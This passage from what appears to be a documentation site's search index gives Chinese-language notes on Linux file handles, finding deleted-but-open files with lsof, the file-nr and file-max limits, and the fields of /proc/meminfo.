\uff1a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53e5\u67c4\u8fd8\u53ef\u4ee5\u7528\u4e8e\u8de8\u8fdb\u7a0b\u901a\u4fe1\uff0c\u5982\u7ba1\u9053\u3001\u4fe1\u53f7\u91cf\u7b49\u3002 \u5728CentOS\u7cfb\u7edf\u4e2d\uff0c\u53e5\u67c4\u7684\u6982\u5ff5\u662f\u975e\u5e38\u6838\u5fc3\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u79cd\u6709\u6548\u548c\u5b89\u5168\u7684\u65b9\u5f0f\u6765\u7ba1\u7406\u548c\u64cd\u4f5c\u5404\u79cd\u7cfb\u7edf\u8d44\u6e90\u3002\u7406\u89e3\u53e5\u67c4\u7684\u5de5\u4f5c\u539f\u7406\u5bf9\u4e8e\u8fdb\u884c\u7cfb\u7edf\u7f16\u7a0b\u548c\u8d44\u6e90\u7ba1\u7406\u975e\u5e38\u91cd\u8981\u3002 \u5728Linux\u548c\u7c7bUnix\u7cfb\u7edf\u4e2d\uff08\u5982CentOS\uff09\uff0c\u5373\u4f7f\u6587\u4ef6\u88ab\u5220\u9664\u4e86\uff0c\u53ea\u8981\u6709\u8fdb\u7a0b\u4ecd\u7136\u6301\u6709\u8be5\u6587\u4ef6\u7684\u53e5\u67c4\u5e76\u6253\u5f00\u7740\u8be5\u6587\u4ef6\uff0c\u6587\u4ef6\u6240\u5360\u7528\u7684\u7a7a\u95f4\u5c31\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u8fd9\u662f\u56e0\u4e3a\u6587\u4ef6\u7cfb\u7edf\u662f\u57fa\u4e8e\u5f15\u7528\u8ba1\u6570\u7684\u3002\u5f53\u4e00\u4e2a\u6587\u4ef6\u88ab\u6253\u5f00\u65f6\uff0c\u7cfb\u7edf\u4f1a\u4e3a\u8be5\u6587\u4ef6\u589e\u52a0\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\u3002\u5373\u4f7f\u8be5\u6587\u4ef6\u88ab\u4ece\u6587\u4ef6\u7cfb\u7edf\u4e2d\u5220\u9664\uff08\u4f8b\u5982\uff0c\u901a\u8fc7 rm \u547d\u4ee4\uff09\uff0c\u53ea\u8981\u6709\u8fdb\u7a0b\u6301\u6709\u8be5\u6587\u4ef6\u7684\u53e5\u67c4\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u4e0d\u4f1a\u4ece\u78c1\u76d8\u4e0a\u5220\u9664\uff0c\u56e0\u4e3a\u5b83\u7684\u5f15\u7528\u8ba1\u6570\u4e0d\u4e3a\u96f6\u3002\u53ea\u6709\u5f53\u6240\u6709\u6301\u6709\u8be5\u6587\u4ef6\u53e5\u67c4\u7684\u8fdb\u7a0b\u90fd\u5173\u95ed\u4e86\u5bf9\u5b83\u7684\u5f15\u7528\u540e\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u624d\u4f1a\u88ab\u6700\u7ec8\u5220\u9664\uff0c\u7a7a\u95f4\u4e5f\u968f\u4e4b\u91ca\u653e\u3002 \u5728\u60a8\u7684\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u6253\u5f00\u4e86\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\uff0c\u5e76\u4e14\u5728\u6587\u4ef6\u88ab\u5220\u9664\u540e\u4ecd\u7136\u4fdd\u6301\u6253\u5f00\u72b6\u6001\uff0c\u8be5\u6587\u4ef6\u7684\u6570\u636e\u4ecd\u7136\u4f1a\u5360\u7528\u78c1\u76d8\u7a7a\u95f4\u3002\u8fd9\u79cd\u60c5\u51b5\u5728\u5904\u7406\u65e5\u5fd7\u6587\u4ef6\u65f6\u5c24\u4e3a\u5e38\u89c1\uff0c\u56e0\u4e3a\u65e5\u5fd7\u6587\u4ef6\u901a\u5e38\u88ab\u957f\u65f6\u95f4\u5730\u6301\u7eed\u5199\u5165\u3002 \u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u60a8\u53ef\u4ee5\uff1a \u91cd\u542f\u76f8\u5173\u8fdb\u7a0b \uff1a\u8fd9\u662f\u6700\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\u3002\u91cd\u542f\u6301\u6709\u8be5\u6587\u4ef6\u53e5\u67c4\u7684\u8fdb\u7a0b\u4f1a\u5bfc\u81f4\u5176\u5173\u95ed\u6240\u6709\u6253\u5f00\u7684\u6587\u4ef6\u53e5\u67c4\uff0c\u4ece\u800c\u5141\u8bb8\u7cfb\u7edf\u91ca\u653e\u6587\u4ef6\u5360\u7528\u7684\u7a7a\u95f4\u3002 \u67e5\u770b\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u5220\u9664\u7684\u6587\u4ef6\u5360\u7528\u5927\u5c0f [root@VM-0-16-centos ~]# echo \"COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME \u5360\u7528\u5927\u5c0f\" ;lsof | awk '/deleted/{print $0,$9/1024/1024/1024\"GB\"}' | sort -k9nr COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME \u5360\u7528\u5927\u5c0f sh 11523 11524 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11525 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11526 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11527 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11528 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11529 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11530 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11531 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 27785 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 30844 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB netserver 5170 root 1w REG 253,1 0 491598 /tmp/netserver.debug_5170 (deleted) 0GB netserver 5170 root 2w REG 253,1 0 491598 /tmp/netserver.debug_5170 (deleted) 0GB netserver 5170 root 4w REG 253,1 0 491598 /tmp/netserver.debug_5170 (deleted) 0GB popup 21301 root 1u CHR 136,0 0t0 3 /dev/pts/0 (deleted) 0GB popup 21301 root 2u CHR 136,0 0t0 3 /dev/pts/0 (deleted) 0GB sh 11523 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0GB syslog-ng 310 root 7u REG 253,1 16384 33121 /var/lib/syslog-ng/syslog-ng.persist- (deleted) 0GB","title":"\u53e5\u67c4"},{"location":"system/linux/IO/%E5%8F%A5%E6%9F%84/#_1","text":"/proc/sys/fs/file-nr \u6587\u4ef6\u8fd4\u56de\u7684\u4e09\u4e2a\u6570\u5b57\u5206\u522b\u4ee3\u8868\u4ee5\u4e0b\u542b\u4e49\uff1a \u5f53\u524d\u6253\u5f00\u7684\u6587\u4ef6\u53e5\u67c4\u6570 \uff1a\u8fd9\u4e2a\u6570\u5b57\u8868\u793a\u5f53\u524d\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u6253\u5f00\u7684\u6587\u4ef6\u53e5\u67c4\u7684\u6570\u91cf\u3002\u6587\u4ef6\u53e5\u67c4\u662f\u7cfb\u7edf\u7528\u4e8e\u6807\u8bc6\u6253\u5f00\u6587\u4ef6\u7684\u4e00\u4e2a\u5f15\u7528\u3002 \u5206\u914d\u7684\u6587\u4ef6\u53e5\u67c4\u603b\u6570 \uff1a\u8fd9\u4e2a\u6570\u5b57\u8868\u793a\u7cfb\u7edf\u5df2\u7ecf\u5206\u914d\u7684\u6587\u4ef6\u53e5\u67c4\u7684\u603b\u6570\u3002\u4e0d\u662f\u6240\u6709\u7684\u5206\u914d\u90fd\u4f1a\u88ab\u4f7f\u7528\uff0c\u56e0\u6b64\u8fd9\u4e2a\u6570\u5b57\u53ef\u80fd\u9ad8\u4e8e\u7b2c\u4e00\u4e2a\u6570\u5b57\u3002 \u7cfb\u7edf\u5141\u8bb8\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570 \uff1a\u8fd9\u4e2a\u6570\u5b57\u662f\u7cfb\u7edf\u914d\u7f6e\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u3002\u8fd9\u662f\u7cfb\u7edf\u7ea7\u522b\u7684\u9650\u5236\uff0c\u610f\u5473\u7740\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u8fdb\u7a0b\u5171\u4eab\u8fd9\u4e2a\u9650\u5236\u3002\u5f53\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u53e5\u67c4\u6570\u91cf\u8fbe\u5230\u8fd9\u4e2a\u6570\u65f6\uff0c\u5c06\u65e0\u6cd5\u6253\u5f00\u66f4\u591a\u7684\u6587\u4ef6\u3002 \u4f8b\u5982\uff0c\u5982\u679c /proc/sys/fs/file-nr \u6587\u4ef6\u663e\u793a 1024 4096 32768 \uff0c\u8fd9\u610f\u5473\u7740\u5f53\u524d\u67091024\u4e2a\u6587\u4ef6\u53e5\u67c4\u6b63\u5728\u4f7f\u7528\u4e2d\uff0c\u7cfb\u7edf\u5df2\u7ecf\u5206\u914d\u4e864096\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u800c\u7cfb\u7edf\u914d\u7f6e\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u4e3a32768\u3002 \u8fd9\u4e9b\u6570\u5b57\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u5458\u6765\u8bf4\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u7cfb\u7edf\u8fbe\u5230\u6587\u4ef6\u53e5\u67c4\u7684\u9650\u5236\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6587\u4ef6\u6253\u5f00\u5931\u8d25\uff0c\u5f71\u54cd\u7cfb\u7edf\u7a33\u5b9a\u6027\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u6b63\u5e38\u8fd0\u884c\u3002\u5982\u679c\u53d1\u73b0\u6b63\u5728\u4f7f\u7528\u7684\u6587\u4ef6\u53e5\u67c4\u6570\u91cf\u63a5\u8fd1\u6700\u5927\u9650\u5236\uff0c\u7ba1\u7406\u5458\u53ef\u80fd\u9700\u8981\u589e\u52a0\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u6216\u4f18\u5316\u5e94\u7528\u7a0b\u5e8f\u4ee5\u51cf\u5c11\u6587\u4ef6\u53e5\u67c4\u7684\u4f7f\u7528\u3002","title":"\u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u4e2d\u53e5\u67c4\u6570\u91cf"},{"location":"system/linux/IO/%E5%8F%A5%E6%9F%84/#_2","text":"\u901a\u8fc7 /proc/sys/fs/file-max \u6587\u4ef6\u8bbe\u7f6e\uff0c \u8fd9\u4e2a\u6587\u4ef6\u63a7\u5236\u7740\u7cfb\u7edf\u7ea7\u522b\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\u3002\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684\u9650\u5236\u5e76\u6839\u636e\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u65b0\u503c\u3002 \u67e5\u770b\u5f53\u524d\u7684\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\uff1a bashCopy code cat /proc/sys/fs/file-max \u4e34\u65f6\u8bbe\u7f6e\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\uff08\u5728\u4e0b\u6b21\u91cd\u542f\u540e\u5931\u6548\uff09\uff1a bashCopy code echo [number] > /proc/sys/fs/file-max \u6c38\u4e45\u8bbe\u7f6e\u6700\u5927\u6587\u4ef6\u53e5\u67c4\u6570\uff0c\u9700\u8981\u7f16\u8f91 /etc/sysctl.conf \u6587\u4ef6\uff0c\u6dfb\u52a0\u6216\u4fee\u6539\u4ee5\u4e0b\u884c\uff1a bashCopy code fs.file-max = [number] \u7136\u540e\u8fd0\u884c sysctl -p \u6765\u4f7f\u6539\u52a8\u751f\u6548\u3002","title":"\u8bbe\u7f6e\u7cfb\u7edf\u6700\u5927\u53e5\u67c4\u6570\u91cf"},{"location":"system/linux/IO/%E5%8F%A5%E6%9F%84/#_3","text":"\u5728CentOS\u8fd9\u6837\u7684Linux\u7cfb\u7edf\u4e2d\uff0c\u53e5\u67c4\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u6982\u5ff5\u3002\u53e5\u67c4\uff08Handle\uff09\u662f\u4e00\u4e2a\u62bd\u8c61\u7684\u6982\u5ff5\uff0c\u7528\u4e8e\u5728\u8f6f\u4ef6\u4e2d\u4ee3\u8868\u548c\u7ba1\u7406\u5bf9\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u3002\u8fd9\u4e9b\u8d44\u6e90\u53ef\u4ee5\u5305\u62ec\u6587\u4ef6\u3001\u7f51\u7edc\u8fde\u63a5\u3001\u8fdb\u7a0b\u3001\u7ebf\u7a0b\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002\u53e5\u67c4\u7684\u4e3b\u8981\u7528\u9014\u548c\u610f\u4e49\u5305\u62ec\uff1a 1.\u8d44\u6e90\u5f15\u7528 \uff1a\u53e5\u67c4\u5145\u5f53\u8d44\u6e90\u7684\u5f15\u7528\u6216\u6807\u8bc6\u7b26\u3002\u4f8b\u5982\uff0c\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u7a0b\u5e8f\u901a\u8fc7\u8fd9\u4e2a\u53e5\u67c4\u6765\u8fdb\u884c\u540e\u7eed\u7684\u8bfb\u5199\u64cd\u4f5c\u3002 2.\u62bd\u8c61\u5316\u8d44\u6e90\u64cd\u4f5c \uff1a\u53e5\u67c4\u63d0\u4f9b\u4e86\u4e00\u79cd\u62bd\u8c61\u7684\u65b9\u5f0f\u6765\u64cd\u4f5c\u8d44\u6e90\u3002\u7a0b\u5e8f\u5458\u4e0d\u9700\u8981\u77e5\u9053\u8d44\u6e90\u7684\u5177\u4f53\u7269\u7406\u7ec6\u8282\uff08\u5982\u5185\u5b58\u5730\u5740\uff09\uff0c\u800c\u662f\u901a\u8fc7\u53e5\u67c4\u6765\u64cd\u4f5c\u3002 3.\u5b89\u5168\u6027\u548c\u7a33\u5b9a\u6027 \uff1a\u901a\u8fc7\u53e5\u67c4\uff0c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u63a7\u5236\u5bf9\u8d44\u6e90\u7684\u8bbf\u95ee\uff0c\u9632\u6b62\u672a\u6388\u6743\u7684\u8bbf\u95ee\u548c\u6f5c\u5728\u7684\u51b2\u7a81\uff0c\u589e\u52a0\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u548c\u7a33\u5b9a\u6027\u3002 4.\u8d44\u6e90\u7ba1\u7406 \uff1a\u64cd\u4f5c\u7cfb\u7edf\u901a\u8fc7\u53e5\u67c4\u6765\u8ddf\u8e2a\u8d44\u6e90\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u8fd9\u6709\u52a9\u4e8e\u8d44\u6e90\u7684\u5206\u914d\u548c\u56de\u6536\uff0c\u9632\u6b62\u8d44\u6e90\u6cc4\u9732\u3002 5.\u8de8\u8fdb\u7a0b\u901a\u4fe1 \uff1a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53e5\u67c4\u8fd8\u53ef\u4ee5\u7528\u4e8e\u8de8\u8fdb\u7a0b\u901a\u4fe1\uff0c\u5982\u7ba1\u9053\u3001\u4fe1\u53f7\u91cf\u7b49\u3002 \u5728CentOS\u7cfb\u7edf\u4e2d\uff0c\u53e5\u67c4\u7684\u6982\u5ff5\u662f\u975e\u5e38\u6838\u5fc3\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u79cd\u6709\u6548\u548c\u5b89\u5168\u7684\u65b9\u5f0f\u6765\u7ba1\u7406\u548c\u64cd\u4f5c\u5404\u79cd\u7cfb\u7edf\u8d44\u6e90\u3002\u7406\u89e3\u53e5\u67c4\u7684\u5de5\u4f5c\u539f\u7406\u5bf9\u4e8e\u8fdb\u884c\u7cfb\u7edf\u7f16\u7a0b\u548c\u8d44\u6e90\u7ba1\u7406\u975e\u5e38\u91cd\u8981\u3002 \u5728Linux\u548c\u7c7bUnix\u7cfb\u7edf\u4e2d\uff08\u5982CentOS\uff09\uff0c\u5373\u4f7f\u6587\u4ef6\u88ab\u5220\u9664\u4e86\uff0c\u53ea\u8981\u6709\u8fdb\u7a0b\u4ecd\u7136\u6301\u6709\u8be5\u6587\u4ef6\u7684\u53e5\u67c4\u5e76\u6253\u5f00\u7740\u8be5\u6587\u4ef6\uff0c\u6587\u4ef6\u6240\u5360\u7528\u7684\u7a7a\u95f4\u5c31\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u8fd9\u662f\u56e0\u4e3a\u6587\u4ef6\u7cfb\u7edf\u662f\u57fa\u4e8e\u5f15\u7528\u8ba1\u6570\u7684\u3002\u5f53\u4e00\u4e2a\u6587\u4ef6\u88ab\u6253\u5f00\u65f6\uff0c\u7cfb\u7edf\u4f1a\u4e3a\u8be5\u6587\u4ef6\u589e\u52a0\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\u3002\u5373\u4f7f\u8be5\u6587\u4ef6\u88ab\u4ece\u6587\u4ef6\u7cfb\u7edf\u4e2d\u5220\u9664\uff08\u4f8b\u5982\uff0c\u901a\u8fc7 rm \u547d\u4ee4\uff09\uff0c\u53ea\u8981\u6709\u8fdb\u7a0b\u6301\u6709\u8be5\u6587\u4ef6\u7684\u53e5\u67c4\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u4e0d\u4f1a\u4ece\u78c1\u76d8\u4e0a\u5220\u9664\uff0c\u56e0\u4e3a\u5b83\u7684\u5f15\u7528\u8ba1\u6570\u4e0d\u4e3a\u96f6\u3002\u53ea\u6709\u5f53\u6240\u6709\u6301\u6709\u8be5\u6587\u4ef6\u53e5\u67c4\u7684\u8fdb\u7a0b\u90fd\u5173\u95ed\u4e86\u5bf9\u5b83\u7684\u5f15\u7528\u540e\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u624d\u4f1a\u88ab\u6700\u7ec8\u5220\u9664\uff0c\u7a7a\u95f4\u4e5f\u968f\u4e4b\u91ca\u653e\u3002 \u5728\u60a8\u7684\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u6253\u5f00\u4e86\u4e00\u4e2a\u65e5\u5fd7\u6587\u4ef6\uff0c\u5e76\u4e14\u5728\u6587\u4ef6\u88ab\u5220\u9664\u540e\u4ecd\u7136\u4fdd\u6301\u6253\u5f00\u72b6\u6001\uff0c\u8be5\u6587\u4ef6\u7684\u6570\u636e\u4ecd\u7136\u4f1a\u5360\u7528\u78c1\u76d8\u7a7a\u95f4\u3002\u8fd9\u79cd\u60c5\u51b5\u5728\u5904\u7406\u65e5\u5fd7\u6587\u4ef6\u65f6\u5c24\u4e3a\u5e38\u89c1\uff0c\u56e0\u4e3a\u65e5\u5fd7\u6587\u4ef6\u901a\u5e38\u88ab\u957f\u65f6\u95f4\u5730\u6301\u7eed\u5199\u5165\u3002 \u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u60a8\u53ef\u4ee5\uff1a \u91cd\u542f\u76f8\u5173\u8fdb\u7a0b \uff1a\u8fd9\u662f\u6700\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\u3002\u91cd\u542f\u6301\u6709\u8be5\u6587\u4ef6\u53e5\u67c4\u7684\u8fdb\u7a0b\u4f1a\u5bfc\u81f4\u5176\u5173\u95ed\u6240\u6709\u6253\u5f00\u7684\u6587\u4ef6\u53e5\u67c4\uff0c\u4ece\u800c\u5141\u8bb8\u7cfb\u7edf\u91ca\u653e\u6587\u4ef6\u5360\u7528\u7684\u7a7a\u95f4\u3002","title":"\u53e5\u67c4\u7684\u610f\u4e49"},{"location":"system/linux/IO/%E5%8F%A5%E6%9F%84/#_4","text":"[root@VM-0-16-centos ~]# echo \"COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME \u5360\u7528\u5927\u5c0f\" ;lsof | awk '/deleted/{print $0,$9/1024/1024/1024\"GB\"}' | sort -k9nr COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME \u5360\u7528\u5927\u5c0f sh 11523 11524 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11525 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11526 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11527 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11528 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11529 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11530 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 11531 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 27785 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB sh 11523 30844 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0.000457785GB netserver 5170 root 1w REG 253,1 0 491598 /tmp/netserver.debug_5170 (deleted) 0GB netserver 5170 root 2w REG 253,1 0 491598 /tmp/netserver.debug_5170 (deleted) 0GB netserver 5170 root 4w REG 253,1 0 491598 /tmp/netserver.debug_5170 (deleted) 0GB popup 21301 root 1u CHR 136,0 0t0 3 /dev/pts/0 (deleted) 0GB popup 21301 root 2u CHR 136,0 0t0 3 /dev/pts/0 (deleted) 0GB sh 11523 root 7u REG 253,1 102 491543 /tmp/yddaemon.log (deleted) 0GB syslog-ng 310 root 7u REG 253,1 16384 33121 /var/lib/syslog-ng/syslog-ng.persist- (deleted) 0GB","title":"\u67e5\u770b\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u5220\u9664\u7684\u6587\u4ef6\u5360\u7528\u5927\u5c0f"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0meminfo/","text":"/proc/meminfo MemTotal \u6240\u6709\u53ef\u7528\u7684 RAM \u5927\u5c0f\uff0c\u7269\u7406\u5185\u5b58\u51cf\u53bb\u9884\u7559\u4f4d\u548c\u5185\u6838\u4f7f\u7528 MemFree \u8868\u793a\u7cfb\u7edf\u5c1a\u672a\u4f7f\u7528\u7684\u5185\u5b58\u3002[MemTotal-MemFree]\u5c31\u662f\u5df2\u88ab\u7528\u6389\u7684\u5185\u5b58\u3002 Buffers \u7528\u6765\u7ed9\u5757\u8bbe\u5907\u505a\u7f13\u5b58\u7684\u5927\u5c0f\uff08\u6587\u4ef6\u7cfb\u7edf\u7684 metadata, tracking in-flight pages\uff09 Cached \u6587\u4ef6\u7684\u7f13\u51b2\u533a\u5927\u5c0f SwapCached \u5df2\u7ecf\u88ab\u4ea4\u6362\u51fa\u6765\u7684\u5185\u5b58\u3002\u4e0e I/O \u76f8\u5173 Active \u7ecf\u5e38\uff08\u6700\u8fd1\uff09\u88ab\u4f7f\u7528\u7684\u5185\u5b58 Inactive \u6700\u8fd1\u4e0d\u5e38\u4f7f\u7528\u7684\u5185\u5b58\u3002\u8fd9\u5f88\u5bb9\u6613\u88ab\u7cfb\u7edf\u79fb\u505a\u4ed6\u7528 Active(anon) \u533f\u540d\u9875\u6fc0\u6d3b\u90e8\u5206 Inactive(anon) \u533f\u540d\u9875\u672a\u6fc0\u6d3b\u90e8\u5206 Active(file): \u4f7f\u7528\u7684\u6587\u4ef6\u7f13\u5b58\u5927\u5c0f Inactive(file): \u672a\u4f7f\u7528\u7684\u6587\u4ef6\u7f13\u5b58\u5927\u5c0f SwapTotal \u4ea4\u6362\u7a7a\u95f4\u603b\u548c SwapFree RAM \u6682\u5b58\u5728 Swap \u4e2d\u7684\u5927\u5c0f Dirty \u7b49\u5f85\u5199\u56de\u7684\u6570\u636e\u5927\u5c0f WriteBack \u6b63\u5728\u5199\u56de\u7684\u6570\u636e\u5927\u5c0f Mapped \u6620\u5c04\u6587\u4ef6\u5927\u5c0f AnonPages \u6620\u5c04\u5230\u7528\u6237\u7a7a\u95f4\u7684\u975e\u6587\u4ef6\u9875\u8868\u5927\u5c0f Slab \u5185\u6838\u6570\u636e\u7ed3\u6784\u7f13\u5b58 SReclaimable Slab \u7684\u4e00\u90e8\u5206\u3002\u5f53\u5185\u5b58\u538b\u529b\u5927\u65f6\uff0c\u53ef\u4ee5 reclaim SUnreclaim \u4e0d\u53ef\u4ee5 reclaim \u7684 Slab PageTables \u6700\u5e95\u5c42\u7684\u9875\u8868\u7684\u5185\u5b58\u7a7a\u95f4 NFS_Unstable \u5df2\u7ecf\u53d1\u7ed9 NFS \u670d\u52a1\u5668\u3001\u4f46\u662f\u5c1a\u672a\u88ab\u786e\u8ba4\uff08committed\uff09\u5199\u5165\u5230\u7a33\u5b9a\u5b58\u50a8\u7684\u9875\u8868 WritebackTmp Memory used by FUSE for temporary writeback buffers CommitLimit CommitLimit = ('vm.overcommit_ratio' * Physical RAM) Committed_AS The amount of memory presently allocated on the system.\uff08\u7cfb\u7edf\u4e2d\u76ee\u524d\u5206\u914d\u4e86\u7684\u5185\u5b58\uff1f\uff09 VmallocTotal vmalloc \u5185\u5b58\u5927\u5c0f VmallocUsed \u5df2\u88ab\u4f7f\u7528\u7684\u865a\u62df\u5185\u5b58\u5927\u5c0f VmallocChunk \u5728 vmalloc \u533a\u57df\u4e2d\u53ef\u7528\u7684\u6700\u5927\u7684\u8fde\u7eed\u5185\u5b58\u5757\u7684\u5927\u5c0f (45\u6761\u6d88\u606f) \u66fe\u6587\u658c: /proc/meminfo\u4e4b\u8c1c\u5b8c\u5168\u63ed\u79d8_Linux\u9605\u7801\u573a\u7684\u535a\u5ba2-CSDN\u535a\u5ba2","title":"/proc/meminfo"},{"location":"system/linux/%E5%86%85%E5%AD%98/0proc0meminfo/#procmeminfo","text":"MemTotal \u6240\u6709\u53ef\u7528\u7684 RAM \u5927\u5c0f\uff0c\u7269\u7406\u5185\u5b58\u51cf\u53bb\u9884\u7559\u4f4d\u548c\u5185\u6838\u4f7f\u7528 MemFree \u8868\u793a\u7cfb\u7edf\u5c1a\u672a\u4f7f\u7528\u7684\u5185\u5b58\u3002[MemTotal-MemFree]\u5c31\u662f\u5df2\u88ab\u7528\u6389\u7684\u5185\u5b58\u3002 Buffers \u7528\u6765\u7ed9\u5757\u8bbe\u5907\u505a\u7f13\u5b58\u7684\u5927\u5c0f\uff08\u6587\u4ef6\u7cfb\u7edf\u7684 metadata, tracking in-flight pages\uff09 Cached \u6587\u4ef6\u7684\u7f13\u51b2\u533a\u5927\u5c0f SwapCached \u5df2\u7ecf\u88ab\u4ea4\u6362\u51fa\u6765\u7684\u5185\u5b58\u3002\u4e0e I/O \u76f8\u5173 Active \u7ecf\u5e38\uff08\u6700\u8fd1\uff09\u88ab\u4f7f\u7528\u7684\u5185\u5b58 Inactive \u6700\u8fd1\u4e0d\u5e38\u4f7f\u7528\u7684\u5185\u5b58\u3002\u8fd9\u5f88\u5bb9\u6613\u88ab\u7cfb\u7edf\u79fb\u505a\u4ed6\u7528 Active(anon) \u533f\u540d\u9875\u6fc0\u6d3b\u90e8\u5206 Inactive(anon) \u533f\u540d\u9875\u672a\u6fc0\u6d3b\u90e8\u5206 Active(file): \u4f7f\u7528\u7684\u6587\u4ef6\u7f13\u5b58\u5927\u5c0f Inactive(file): \u672a\u4f7f\u7528\u7684\u6587\u4ef6\u7f13\u5b58\u5927\u5c0f SwapTotal \u4ea4\u6362\u7a7a\u95f4\u603b\u548c SwapFree RAM \u6682\u5b58\u5728 Swap \u4e2d\u7684\u5927\u5c0f Dirty \u7b49\u5f85\u5199\u56de\u7684\u6570\u636e\u5927\u5c0f WriteBack \u6b63\u5728\u5199\u56de\u7684\u6570\u636e\u5927\u5c0f Mapped \u6620\u5c04\u6587\u4ef6\u5927\u5c0f AnonPages \u6620\u5c04\u5230\u7528\u6237\u7a7a\u95f4\u7684\u975e\u6587\u4ef6\u9875\u8868\u5927\u5c0f Slab \u5185\u6838\u6570\u636e\u7ed3\u6784\u7f13\u5b58 SReclaimable Slab \u7684\u4e00\u90e8\u5206\u3002\u5f53\u5185\u5b58\u538b\u529b\u5927\u65f6\uff0c\u53ef\u4ee5 reclaim SUnreclaim \u4e0d\u53ef\u4ee5 reclaim \u7684 Slab PageTables \u6700\u5e95\u5c42\u7684\u9875\u8868\u7684\u5185\u5b58\u7a7a\u95f4 NFS_Unstable \u5df2\u7ecf\u53d1\u7ed9 NFS 